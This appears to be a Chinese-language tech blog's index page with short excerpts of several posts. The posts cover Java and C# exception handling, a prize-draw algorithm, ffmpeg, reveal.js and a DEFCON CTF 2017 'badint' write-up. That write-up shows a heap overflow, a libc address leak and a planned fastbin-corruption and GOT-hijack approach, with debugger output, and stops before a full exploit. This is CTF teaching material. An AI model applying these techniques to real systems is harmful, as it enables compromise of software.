<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">
<meta name="baidu-site-verification" content="codeva-HZoIBm8yNp" />
<meta name="bytedance-verification-code" content="xa6iZeY+/XCOJvarHaDY" />








<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Liunx Python Rust Goalng DevOPS" />










<meta name="description" content="个人随想，瞎子的世界. Linux Python Rust React Nextjs are my love.">
<meta property="og:type" content="website">
<meta property="og:title" content="逐流小站">
<meta property="og:url" content="https://blog.feedscoin.com/page/42/index.html">
<meta property="og:site_name" content="逐流小站">
<meta property="og:description" content="个人随想，瞎子的世界. Linux Python Rust React Nextjs are my love.">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Laird Lau">
<meta property="article:tag" content="Liunx Python Rust Goalng DevOPS">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.feedscoin.com/page/42/"/>





  <title>逐流小站</title>
  





<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-MW47YH6RH0"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-MW47YH6RH0');
</script>





<meta name="generator" content="Hexo 7.0.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">逐流小站</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">想回到那个能随便跳槽的年代</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            Sitemap
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/%E5%9F%BA%E4%BA%8E%E8%BF%87%E6%BB%A4%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/%E5%9F%BA%E4%BA%8E%E8%BF%87%E6%BB%A4%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/" itemprop="url">基于过滤器实现异常处理的探索</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-20T12:10:28+00:00">
                2017-05-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">编程语言</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          垠神这篇文章其实在说一个问题，Checked Exception 鼓励开发者主动告知调用者来捕获特定异常，这种思路完全是没有问题的，问题是调用者如何能够知道它需要捕获哪些异常，我们不可能每次都通过"转到定义”功能去看一个方法会引发哪些异常，垠神从 PL 的角度出发，想到了通过代码静态分析的方法来处理异常，垠神吐槽的其实是不分青红皂白滥用 try-catch 的做法，实际上 Java 标准库里对异常处理相当混乱，虽然官方鼓励使用 Checked Exception，但是标准库实现和工程实践上不乏将异常包装为 RuntimeException 来规避 Check 的做法，我认为 Checked Exception 在工程学意义上最大贡献是，在开发阶段该抛出什么异常就应该抛出异常，因为这样可以方便我们快读定位问题，而到了发布阶段则应该将这些异常都 catch 住即可，这样用户就不会看到这些奇葩的异常;我们可以注意到 Java 强制让 Foo()方法实现了 throws 声明，原因是在该方法内部可能会引发 FileNotFoundException，如果我们不遵从这一"霸王条款"，那么我们的代码将无法通过编译，而在调用者层面上，Java 的霸道则体现在要求调用者使用 try-catch 结构处理这种异常，或者继续使用 throws 声明来使异常继续向上传递，我更喜欢将这种设计称之为一种理想状态下的异常处理机制，比如我们读写一个文件的时候，除了 FileNotFoundException 以外，可能还会遇到 FileLoadException、PathTooLongException、EndOfStreamException 等等的异常，如果这些异常在业务层面上是无差别的，那么我认为将异常细分到如此精细的程度是没有意义的，因为对用户而言这个时候它关心的是否成功读写了这个文件，具体的异常原因用户并不想真的知道，可是 Java 的 Checked Exception 在面对这种处境的时候，整体而言是显得力不从心的，因为我们不得不在方法从声明该方法会引出哪些异常，这对方法的编写者和方法的调用者来说都很痛苦;可以注意到 C#采用的是一种相对温和的策略，即文档会明确告诉你，某个方法是否会引发异常以及引发哪些异常，但是是否要捕获这些异常则完全由调用者决定，我认为这是 C#之父 Hejlsberg 在权衡后在工程实践上选择的一种妥协，因为 Java 的 Checked Exception 理想主义色彩稍重，并不是在所有场景下我们都需要去处理所有的异常，所以 Checked Exception 带来的问题是，即使在只需要捕获基类异常的情况下，我们依然不得不去捕获各种子类异常，这难道不有点矫枉过正的感觉吗
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/%E5%9F%BA%E4%BA%8E%E8%BF%87%E6%BB%A4%E5%99%A8%E5%AE%9E%E7%8E%B0%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/05/draw-by-prob/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/05/draw-by-prob/" itemprop="url">按照奖品概率分布抽奖的实现</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-18T04:20:23+00:00">
                2017-05-18
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">语言</span>
                  </a>
                </span>

                
                
                  , 
                

              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%AD%E8%A8%80/PHP/" itemprop="url" rel="index">
                    <span itemprop="name">PHP</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>需求：首先用户通过以一定方式（好友点赞等）开启抽奖资格，然后按照用户 100% 中奖概率进行抽奖，且系统的发放奖品需要按照各个奖品整体的期望中奖比例来进行分布，最后用户抽中奖品调用第三方发放接口发放奖品并记录保存，另有些奖品存在发放数量限制。
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/05/draw-by-prob/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/jsdayes-madrid-2017">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/jsdayes-madrid-2017" itemprop="url">Speaking at JSDayES 2017</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-14T04:50:00+00:00">
                2017-05-14
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          I spoke at JSDayES 2017 in Madrid about web performance and images.
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/jsdayes-madrid-2017">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/use-ffmpeg-to-concat-flv-videos-downloaded-by-bilibili-client/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/use-ffmpeg-to-concat-flv-videos-downloaded-by-bilibili-client/" itemprop="url">使用 ffmpeg 拼接 bilibili 客户端所下载的分段 flv 视频</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-13T12:48:50+00:00">
                2017-05-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>唉，我现在用的这破手机播 1080P 视频要掉帧，只好在电脑上看，说不出话。</p>
<h3 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h3><p>前些天我关注的某 <a target="_blank" rel="noopener" href="http://space.bilibili.com/15810/#!/">气人主播</a> 在 bilibili 上传了《盗贼之海》（<em>Sea of Thieves</em>）Alpha 测试的直播录像，却因吃了文化亏不慎违反了保密协定，不久视频就被不存在了。不过好在有热心猛男把缓存好了的睾清视频发了出来，像我这样没赶上趟的人才能爽到 :P</p>
<p><img src="https://img.prin.studio/images/2017/05/13/20170513185210.png" alt="感谢这位pong友"></p>
<p>然而这位pong友上传的是 bilibili 客户端的下载（缓存）格式，虽然放在手机的 <code>/Android/data/tv.danmaku.bili/download</code> 目录下就可以被客户端直接识别，但是想要在电脑上直接播放就没那么容易了。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/use-ffmpeg-to-concat-flv-videos-downloaded-by-bilibili-client/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/RevealJs-slides%E6%BC%94%E7%A4%BA%E5%B7%A5%E5%85%B7-%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/RevealJs-slides%E6%BC%94%E7%A4%BA%E5%B7%A5%E5%85%B7-%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/" itemprop="url">RevealJs(slides演示工具)中文文档</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-13T04:11:15+00:00">
                2017-05-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <blockquote>
<p>reveal.js 就是在各个互联网大会或者科技发布会常用的幻灯片演示工具，也就是slides，功能强大，自适应移动端和PC端。It translated by <a target="_blank" rel="noopener" href="https://github.com/palmerye">Palmer</a> in 2017&#x2F;5&#x2F;13.</p>
</blockquote>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/RevealJs-slides%E6%BC%94%E7%A4%BA%E5%B7%A5%E5%85%B7-%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%A3/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/DEFCON-CTF-2017-Quals-badint/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/DEFCON-CTF-2017-Quals-badint/" itemprop="url">[DEFCON CTF 2017 Quals] badint</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-05-03T16:44:00+00:00">
                2017-05-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: Potent Pwnables<br>Author: bruce30262 @ BambooFox<br>這題是從中間接下去做的，感謝隊友先提供 idb 與 crash input </p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>64 bit ELF, Partial RELRO, 有開DEP,  沒 canary &amp; PIE. <strong>題目沒有提供 libc。</strong> </p>
<p>這是一個 C++ 程式，程式會要使用者輸入一些資料，之後會把這些資料存在 heap 上:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./badint </span><br><span class="line">SEQ #: 0</span><br><span class="line">Offset: 0</span><br><span class="line">Data: AAAAAAA</span><br><span class="line">LSF Yes/No: Yes</span><br><span class="line">RX PDU [0] [len=4]</span><br><span class="line">Assembled [seq: 0]: aaaaaa0a</span><br><span class="line"></span><br><span class="line">SEQ #: </span><br></pre></td></tr></table></figure>
<p>其中我們 data 是輸入 <code>AAAA</code>，但是程式會將其轉成 <code>0xaaaa</code>。</p>
<p>之後根據隊友 <strong>Shao-Chuan Lee</strong> 提供的 crash input 進行動態分析:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SEQ #: 1</span><br><span class="line">Offset: 0</span><br><span class="line">Data: 0000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">LSF Yes/No: Yes</span><br><span class="line">RX PDU [1] [len=31]</span><br><span class="line">Assembled [seq: 1]: 00000000000000000000000000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">SEQ #: 1</span><br><span class="line">Offset: 0</span><br><span class="line">Data: 111111111111111111111111111111111111111</span><br><span class="line">LSF Yes/No: Yes</span><br><span class="line">RX PDU [1] [len=20]</span><br><span class="line">Assembled [seq: 1]: 1111111111111111111111111111111111111101</span><br><span class="line"></span><br><span class="line">SEQ #: 1</span><br><span class="line">Offset: 18</span><br><span class="line">Data: 22222222222222222222222</span><br><span class="line">LSF Yes/No: Yes</span><br><span class="line">RX PDU [1] [len=12]</span><br><span class="line">Assembled [seq: 1]: 000000000000000022222202</span><br><span class="line"></span><br><span class="line">*** Error in `./badint&#x27;: free(): invalid next size (fast): 0x000000000224a0c0 ***</span><br></pre></td></tr></table></figure>

<p>看起來是因為 heap overflow 的關係導致 <code>free()</code> 在檢查 nextsize 時發現錯誤，直接 abort 程式。經分析後發現漏洞發生在以下程式碼:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">len = get_len(cur_obj);</span><br><span class="line">data = get_data(cur_obj);</span><br><span class="line">offset = get_offset(cur_obj);</span><br><span class="line"><span class="built_in">memcpy</span>(new_buf + offset, data, len); <span class="comment">// &lt;-- 這裡</span></span><br></pre></td></tr></table></figure>

<p>程式在複製 data 進 heap buffer 時，採用 <code>memcpy(new_buf + offset, data, len)</code> 這樣的形式進行複製。因為 <code>offet</code> 我們可控的關係，因此我們可以指定複製的起點，進而觸發 heap overflow 漏洞。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先來 leak address 吧。透過以下操作，我們可以 leak 出 libc 的 address:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./badint </span><br><span class="line">SEQ #: 1</span><br><span class="line">Offset: 8</span><br><span class="line">Data: 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br><span class="line">LSF Yes/No: Yes</span><br><span class="line">RX PDU [1] [len=144]</span><br><span class="line">Assembled [seq: 1]: 788ba4952b7f000011111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br><span class="line"></span><br><span class="line">SEQ #:</span><br></pre></td></tr></table></figure>

<p>我們將 offset 設定為 8，之後程式會將 data 複製進 <code>heap_buf+8</code>。其中，<code>heap_buf</code> 為一個被重新 allocate 的 unsortbin chunk，因此其 <code>fd</code> 跟 <code>bk</code> 均會包含 libc address ( 實際上為 <code>main_arena+88</code> )。此時我們將 data 複製進 <code>heap_buf</code> 時，只有 <code>bk</code> 會被蓋掉，因此之後程式印出 assebled 的 data 時，會將 <code>fd</code> 的內容給 leak 出來，我們就拿到了 libc 的 address。</p>
<p>之後要來想辦法控制程式流程。這裡我是利用 fastbin corruption 搭配 GOT hijacking 來達到這件事。首先我們想辦法排出類似下面的 heap layout:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ hip</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0xc26cc0 --&gt; 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0xc26c80 --&gt; 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0xc26c20 --&gt; 0x0   </span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">                  top: 0xc26f10 (size : 0x1c0f0) </span><br><span class="line">       last_remainder: 0xc26e00 (size : 0x50) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure>

